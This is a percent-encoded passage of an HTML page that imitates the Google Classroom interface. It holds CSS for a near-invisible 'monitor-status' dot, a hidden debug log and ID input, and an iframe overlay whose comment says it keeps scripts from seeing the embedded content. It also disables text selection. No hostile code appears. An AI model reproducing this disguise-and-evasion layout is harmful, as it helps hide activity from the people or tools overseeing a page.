%78%3B%0A%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%73%70%61%63%65%2D%62%65%74%77%65%65%6E%3B%0A%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%7D%0A%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%20%7B%0A%20%20%70%61%64%64%69%6E%67%2D%6C%65%66%74%3A%20%30%2E%35%72%65%6D%3B%0A%20%20%70%61%64%64%69%6E%67%2D%74%6F%70%3A%20%30%2E%32%35%72%65%6D%3B%0A%20%20%70%61%64%64%69%6E%67%2D%62%6F%74%74%6F%6D%3A%20%30%2E%32%35%72%65%6D%3B%0A%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%34%70%78%3B%0A%20%20%64%69%73%70%6C%61%79%3A%20%66%6C%65%78%3B%0A%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%67%61%70%3A%20%30%2E%38%72%65%6D%3B%0A%20%20%74%72%61%6E%73%69%74%69%6F%6E%3A%20%62%61%63%6B%67%72%6F%75%6E%64%20%30%2E%31%35%73%3B%0A%20%20%77%68%69%74%65%2D%73%70%61%63%65%3A%20%6E%6F%77%72%61%70%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%0A%20%20%74%65%78%74%2D%6F%76%65%72%66%6C%6F%77%3A%20%65%6C%6C%69%70%73%69%73%3B%0A%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%30%2E%38%37%35%72%65%6D%3B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%35%30%30%3B%20%2F%2A%20%73%6C%69%67%68%74%6C%79%20%62%6F%6C%64%65%72%20%2A%2F%0A%7D%0A%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%3A%68%6F%76%65%72%20%7B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%65%33%66%32%66%64%3B%0A%7D%0A%0A%2F%2A%20%46%61%76%69%63%6F%6E%20%73%74%79%6C%65%73%20%2A%2F%0A%2E%66%61%76%69%63%6F%6E%2D%69%6D%67%2C%20%2E%66%61%76%69%63%6F%6E%2D%6C%65%74%74%65%72%20%7B%0A%20%20%77%69%64%74%68%3A%20%32%30%70%78%3B%0A%20%20%68%65%69%67%68%74%3A%20%32%30%70%78%3B%0A%20%20%66%6C%65%78%2D%73%68%72%69%6E%6B%3A%20%30%3B%0A%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%35%30%25%3B%0A%20%20%64%69%73%70%6C%61%79%3A%20%66%6C%65%78%3B%0A%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%63%65%6E%74%65%72%3B%0A%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%30%2E%37%35%72%65%6D%3B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%20%2F%2A%20%73%6C%69%67%68%74%6C%79%20%68%65%61%76%69%65%72%20%2A%2F%0A%20%20%63%6F%6C%6F%72%3A%20%23%30%30%30%3B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%23%63%66%64%38%64%63%3B%0A%7D%0A%0A%2F%2A%20%53%68%69%6D%6D%65%72%20%73%6B%65%6C%65%74%6F%6E%20%6C%6F%61%64%65%72%20%2A%2F%0A%40%6B%65%79%66%72%61%6D%65%73%20%73%68%69%6D%6D%65%72%20%7B%0A%20%20%30%25%20%7B%20%62%61%63%6B%67%72%6F%75%6E%64%2D%70%6F%73%69%74%69%6F%6E%3A%20%2D%34%30%30%70%78%20%30%3B%20%7D%0A%20%20%31%30%30%25%20%7B%20%62%61%63%6B%67%72%6F%75%6E%64%2D%70%6F%73%69%74%69%6F%6E%3A%20%34%30%30%70%78%20%30%3B%20%7D%0A%7D%0A%2E%73%6B%65%6C%65%74%6F%6E%20%7B%0A%20%20%70%6F%73%69%74%69%6F%6E%3A%20%72%65%6C%61%74%69%76%65%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%65%30%65%30%65%30%3B%0A%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%34%70%78%3B%0A%7D%0A%2E%73%6B%65%6C%65%74%6F%6E%3A%3A%61%66%74%65%72%20%7B%0A%20%20%63%6F%6E%74%65%6E%74%3A%20%27%27%3B%0A%20%20%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%0A%20%20%74%6F%70%3A%20%30%3B%0A%20%20%6C%65%66%74%3A%20%30%3B%0A%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%68%65%69%67%68%74%3A%20%31%30%30%25%3B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%6C%69%6E%65%61%72%2D%67%72%61%64%69%65%6E%74%28%39%30%64%65%67%2C%20%74%72%61%6E%73%70%61%72%65%6E%74%2C%20%72%67%62%61%28%32%35%35%2C%32%35%35%2C%32%35%35%2C%30%2E%34%29%2C%20%74%72%61%6E%73%70%61%72%65%6E%74%29%3B%0A%20%20%61%6E%69%6D%61%74%69%6F%6E%3A%20%73%68%69%6D%6D%65%72%20%34%73%20%69%6E%66%69%6E%69%74%65%3B%0A%7D%0A%0A%2F%2A%20%44%69%73%61%62%6C%65%20%74%65%78%74%20%73%65%6C%65%63%74%69%6F%6E%20%2A%2F%0A%62%6F%64%79%2C%20%62%6F%64%79%20%2A%20%7B%0A%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%2D%77%65%62%6B%69%74%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%2D%6D%6F%7A%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%2D%6D%73%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%7D%0A%0A%2F%2A%20%50%72%65%76%65%6E%74%20%74%65%78%74%2F%69%6D%61%67%65%20%64%72%61%67%67%69%6E%67%20%2A%2F%0A%69%6D%67%2C%20%61%20%7B%0A%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%61%75%74%6F%3B%0A%20%20%2D%77%65%62%6B%69%74%2D%75%73%65%72%2D%64%72%61%67%3A%20%6E%6F%6E%65%3B%0A%20%20%75%73%65%72%2D%64%72%61%67%3A%20%6E%6F%6E%65%3B%0A%7D%0A%0A%2F%2A%20%41%63%74%69%76%65%20%6C%69%6E%6B%20%68%69%67%68%6C%69%67%68%74%20%2A%2F%0A%2E%61%63%74%69%76%65%2D%6C%69%6E%6B%20%7B%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%64%32%65%33%66%63%3B%0A%20%20%63%6F%6C%6F%72%3A%20%23%31%39%36%37%64%32%3B%0A%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%20%0A%7D%0A%0A%20%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%73%74%61%74%75%73%20%7B%0A%20%20%20%20%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%20%20%20%20%62%6F%74%74%6F%6D%3A%20%31%30%70%78%3B%0A%20%20%20%20%20%20%20%20%72%69%67%68%74%3A%20%31%30%70%78%3B%0A%20%20%20%20%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%36%70%78%3B%0A%20%20%20%20%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%36%70%78%3B%0A%20%20%20%20%20%20%20%20%77%69%64%74%68%3A%20%31%36%70%78%3B%0A%20%20%20%20%20%20%20%20%68%65%69%67%68%74%3A%20%31%36%70%78%3B%0A%20%20%20%20%20%20%20%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%20%20%20%20%7A%2D%69%6E%64%65%78%3A%20%32%35%30%30%3B%0A%20%20%20%20%20%20%20%20%63%75%72%73%6F%72%3A%20%64%65%66%61%75%6C%74%3B%0A%20%20%20%20%20%20%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%2D%77%65%62%6B%69%74%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%2D%6D%6F%7A%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%2D%6D%73%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%73%74%61%74%75%73%2E%61%6C%65%72%74%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%30%2C%20%32%35%35%2C%20%30%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%47%72%65%65%6E%20%64%6F%74%2C%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%73%74%61%74%75%73%2E%73%61%66%65%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%30%2C%20%30%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%52%65%64%20%64%6F%74%2C%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%20%7B%0A%20%20%20%20%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%20%20%20%20%62%6F%74%74%6F%6D%3A%20%33%30%70%78%3B%0A%20%20%20%20%20%20%20%20%72%69%67%68%74%3A%20%31%30%70%78%3B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%30%2C%20%30%2C%20%30%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%35%70%78%3B%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%35%70%78%3B%0A%20%20%20%20%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%7A%2D%69%6E%64%65%78%3A%20%32%35%30%30%3B%0A%20%20%20%20%20%20%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%61%75%74%6F%3B%0A%20%20%20%20%20%20%20%20%2D%77%65%62%6B%69%74%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%61%75%74%6F%3B%0A%20%20%20%20%20%20%20%20%2D%6D%6F%7A%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%61%75%74%6F%3B%0A%20%20%20%20%20%20%20%20%2D%6D%73%2D%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%61%75%74%6F%3B%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%64%65%62%75%67%2D%6C%6F%67%20%7B%0A%20%20%20%20%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%20%20%20%20%62%6F%74%74%6F%6D%3A%20%37%30%70%78%3B%0A%20%20%20%20%20%20%20%20%72%69%67%68%74%3A%20%31%30%70%78%3B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%30%2C%20%30%2C%20%30%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%35%70%78%3B%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%35%70%78%3B%0A%20%20%20%20%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%7A%2D%69%6E%64%65%78%3A%20%32%35%30%30%3B%0A%20%20%20%20%20%20%20%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%32%30%30%70%78%3B%0A%20%20%20%20%20%20%20%20%6F%76%65%72%66%6C%6F%77%2D%79%3A%20%61%75%74%6F%3B%0A%20%20%20%20%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%32%70%78%3B%0A%20%20%20%20%20%20%20%20%77%69%64%74%68%3A%20%33%30%30%70%78%3B%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%20%69%6E%70%75%74%20%7B%0A%20%20%20%20%20%20%20%20%77%69%64%74%68%3A%20%32%30%30%70%78%3B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%31%29%3B%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%20%62%75%74%74%6F%6E%20%7B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%36%38%2C%20%36%38%2C%20%30%2E%33%33%29%3B%20%2F%2A%20%36%37%25%20%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%33%29%3B%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%35%70%78%3B%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%33%70%78%3B%0A%20%20%20%20%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%7D%0A%20%20%20%20%23%6D%6F%6E%69%74%6F%72%2D%63%75%73%74%6F%6D%2D%69%64%2D%69%6E%70%75%74%20%62%75%74%74%6F%6E%3A%68%6F%76%65%72%20%7B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%36%38%2C%20%36%38%2C%20%30%2E%35%29%3B%0A%20%20%20%20%7D%0A%0A%2F%2A%20%53%69%64%65%62%61%72%20%68%6F%76%65%72%20%73%63%61%6C%65%20%65%66%66%65%63%74%20%2A%2F%0A%2E%73%69%64%65%62%61%72%2D%73%63%61%6C%65%20%7B%0A%20%20%74%72%61%6E%73%66%6F%72%6D%3A%20%73%63%61%6C%65%28%31%2E%30%35%29%3B%0A%20%20%74%72%61%6E%73%66%6F%72%6D%2D%6F%72%69%67%69%6E%3A%20%74%6F%70%20%6C%65%66%74%3B%0A%7D%0A%0A%2F%2A%20%49%66%72%61%6D%65%20%6F%76%65%72%6C%61%79%20%61%6C%77%61%79%73%20%69%6E%20%66%72%6F%6E%74%20%76%69%73%75%61%6C%6C%79%2C%20%62%75%74%20%69%6E%76%69%73%69%62%6C%65%20%74%6F%20%70%6F%69%6E%74%65%72%2F%69%6E%74%65%72%61%63%74%69%6F%6E%20%2A%2F%0A%23%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%20%7B%0A%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%20%20%20%20%20%20%2F%2A%20%6B%65%65%70%20%69%74%73%20%6F%72%69%67%69%6E%61%6C%20%70%6F%73%69%74%69%6F%6E%69%6E%67%20%2A%2F%0A%20%20%74%6F%70%3A%20%2D%31%70%78%3B%20%20%20%20%20%20%20%20%20%20%20%20%2F%2A%20%68%65%61%64%65%72%20%68%65%69%67%68%74%20%2A%2F%0A%20%20%6C%65%66%74%3A%20%31%36%2E%35%72%65%6D%3B%20%20%20%20%20%20%20%20%20%20%20%2F%2A%20%73%69%64%65%62%61%72%20%77%69%64%74%68%20%2A%2F%0A%20%20%72%69%67%68%74%3A%20%30%3B%0A%20%20%62%6F%74%74%6F%6D%3A%20%30%3B%0A%20%20%7A%2D%69%6E%64%65%78%3A%20%32%30%30%30%3B%20%20%20%20%20%20%20%20%20%20%20%2F%2A%20%61%62%6F%76%65%20%65%76%65%72%79%74%68%69%6E%67%20%65%6C%73%65%20%2A%2F%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%77%68%69%74%65%3B%0A%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%38%70%78%3B%0A%20%20%62%6F%78%2D%73%68%61%64%6F%77%3A%20%30%20%34%70%78%20%31%32%70%78%20%72%67%62%61%28%30%2C%30%2C%30%2C%30%2E%31%35%29%3B%0A%20%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%0A%0A%20%20%2F%2A%20%54%48%49%53%20%6D%61%6B%65%73%20%73%63%72%69%70%74%73%20%69%67%6E%6F%72%65%20%74%68%65%20%69%66%72%61%6D%65%20%76%69%73%75%61%6C%6C%79%2C%20%6F%6E%6C%79%20%73%65%65%20%77%68%61%74%27%73%20%62%65%68%69%6E%64%20%2A%2F%0A%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%6E%6F%6E%65%3B%0A%7D%0A%23%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%20%69%66%72%61%6D%65%20%7B%0A%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%68%65%69%67%68%74%3A%20%31%30%30%25%3B%0A%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%61%75%74%6F%3B%20%2F%2A%20%69%66%72%61%6D%65%20%73%74%69%6C%6C%20%69%6E%74%65%72%61%63%74%61%62%6C%65%20%69%66%20%63%6C%69%63%6B%65%64%20%6D%61%6E%75%61%6C%6C%79%20%2A%2F%0A%7D%0A%0A%0A%2F%2A%20%49%66%72%61%6D%65%20%74%6F%67%67%6C%65%20%62%75%74%74%6F%6E%20%2A%2F%0A%23%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%20%7B%0A%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%62%6F%74%74%6F%6D%3A%20%32%30%70%78%3B%0A%20%20%6C%65%66%74%3A%20%32%30%70%78%3B%0A%20%20%77%69%64%74%68%3A%20%34%30%70%78%3B%0A%20%20%68%65%69%67%68%74%3A%20%34%30%70%78%3B%0A%0A%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%32%29%3B%20%2F%2A%20%73%65%6D%69%2D%74%72%61%6E%73%70%61%72%65%6E%74%20%2A%2F%0A%20%20%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%38%70%78%29%3B%20%20%20%20%20%20%20%20%20%20%20%2F%2A%20%62%6C%75%72%20%62%61%63%6B%67%72%6F%75%6E%64%20%62%65%68%69%6E%64%20%2A%2F%0A%20%20%2D%77%65%62%6B%69%74%2D%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%38%70%78%29%3B%20%20%20%2F%2A%20%53%61%66%61%72%69%20%73%75%70%70%6F%72%74%20%2A%2F%0A%0A%20%20%63%6F%6C%6F%72%3A%20%77%68%69%74%65%3B%0A%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%39%39%39%39%70%78%3B%0A%20%20%64%69%73%70%6C%61%79%3A%20%66%6C%65%78%3B%0A%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%63%65%6E%74%65%72%3B%0A%20%20%63%75%72%73%6F%72%3A%20%67%72%61%62%3B%0A%20%20%7A%2D%69%6E%64%65%78%3A%20%32%31%30%30%3B%20%2F%2A%20%61%62%6F%76%65%20%69%66%72%61%6D%65%20%2A%2F%0A%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%36%70%78%3B%0A%20%20%75%73%65%72%2D%73%65%6C%65%63%74%3A%20%6E%6F%6E%65%3B%0A%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%33%29%3B%20%2F%2A%20%73%75%62%74%6C%65%20%62%6F%72%64%65%72%20%66%6F%72%20%67%6C%61%73%73%20%6C%6F%6F%6B%20%2A%2F%0A%7D%0A%0A%23%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%3A%61%63%74%69%76%65%20%7B%0A%20%20%63%75%72%73%6F%72%3A%20%67%72%61%62%62%69%6E%67%3B%0A%7D%0A%3C%2F%73%74%79%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%20%63%6C%61%73%73%3D%22%62%67%2D%5B%23%66%38%66%61%66%63%5D%20%6D%69%6E%2D%68%2D%73%63%72%65%65%6E%20%66%6C%65%78%22%3E%0A%0A%3C%21%2D%2D%20%53%69%64%65%62%61%72%20%2D%2D%3E%0A%3C%61%73%69%64%65%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%77%2D%36%34%20%62%67%2D%77%68%69%74%65%20%62%6F%72%64%65%72%2D%72%20%62%6F%72%64%65%72%2D%67%72%61%79%2D%32%30%30%20%72%65%6C%61%74%69%76%65%20%7A%2D%31%30%20%73%69%64%65%62%61%72%2D%73%63%61%6C%65%22%3E%0A%20%20%3C%68%65%61%64%65%72%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%35%20%70%79%2D%34%20%62%6F%72%64%65%72%2D%62%20%62%6F%72%64%65%72%2D%67%72%61%79%2D%32%30%30%22%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%4D%65%6E%75%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%78%6C%22%3E%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%62%61%72%73%22%3E%3C%2F%69%3E%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%69%6D%67%20%61%6C%74%3D%22%47%6F%6F%67%6C%65%20%43%6C%61%73%73%72%6F%6F%6D%20%69%63%6F%6E%22%20%63%6C%61%73%73%3D%22%77%2D%36%20%68%2D%36%20%6D%6C%2D%32%22%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%67%73%74%61%74%69%63%2E%63%6F%6D%2F%63%6C%61%73%73%72%6F%6F%6D%2F%69%63%5F%70%72%6F%64%75%63%74%5F%63%6C%61%73%73%72%6F%6F%6D%5F%31%34%34%2E%70%6E%67%22%3E%0A%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%38%30%30%20%74%65%78%74%2D%62%61%73%65%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%20%6D%6C%2D%32%22%3E%43%6C%61%73%73%72%6F%6F%6D%3C%2F%73%70%61%6E%3E%0A%20%20%3C%2F%68%65%61%64%65%72%3E%0A%20%20%3C%6E%61%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%6D%74%2D%34%20%70%78%2D%32%20%73%70%61%63%65%2D%79%2D%31%22%3E%0A%20%20%20%20%3C%61%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%33%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%2D%6C%67%20%62%67%2D%5B%23%64%32%65%33%66%63%5D%20%74%65%78%74%2D%5B%23%31%39%36%37%64%32%5D%20%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%6D%65%64%69%75%6D%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%22%20%68%72%65%66%3D%22%23%22%3E%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%68%6F%6D%65%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%69%3E%20%48%6F%6D%65%3C%2F%61%3E%0A%20%20%20%20%3C%61%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%33%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%2D%6C%67%20%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%31%30%30%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%22%20%68%72%65%66%3D%22%23%22%3E%3C%69%20%63%6C%61%73%73%3D%22%66%61%72%20%66%61%2D%63%61%6C%65%6E%64%61%72%2D%61%6C%74%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%69%3E%20%43%61%6C%65%6E%64%61%72%3C%2F%61%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%65%6E%72%6F%6C%6C%65%64%42%74%6E%22%20%61%72%69%61%2D%65%78%70%61%6E%64%65%64%3D%22%66%61%6C%73%65%22%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%67%61%70%2D%33%20%70%78%2D%33%20%70%79%2D%32%20%72%6F%75%6E%64%65%64%2D%6C%67%20%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%6E%6F%72%6D%61%6C%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%31%30%30%20%73%65%6C%65%63%74%2D%6E%6F%6E%65%20%77%2D%66%75%6C%6C%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%3E%0A%20%20%20%20%20%20%3C%69%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%67%72%61%64%75%61%74%69%6F%6E%2D%63%61%70%20%74%65%78%74%2D%73%6D%22%3E%3C%2F%69%3E%20%45%6E%72%6F%6C%6C%65%64%0A%20%20%20%20%20%20%3C%69%20%69%64%3D%22%65%6E%72%6F%6C%6C%65%64%43%68%65%76%72%6F%6E%22%20%63%6C%61%73%73%3D%22%66%61%73%20%66%61%2D%63%68%65%76%72%6F%6E%2D%64%6F%77%6E%20%6D%6C%2D%61%75%74%6F%20%74%65%78%74%2D%78%73%20%74%72%61%6E%73%69%74%69%6F%6E%2D%74%72%61%6E%73%66%6F%72%6D%20%64%75%72%61%74%69%6F%6E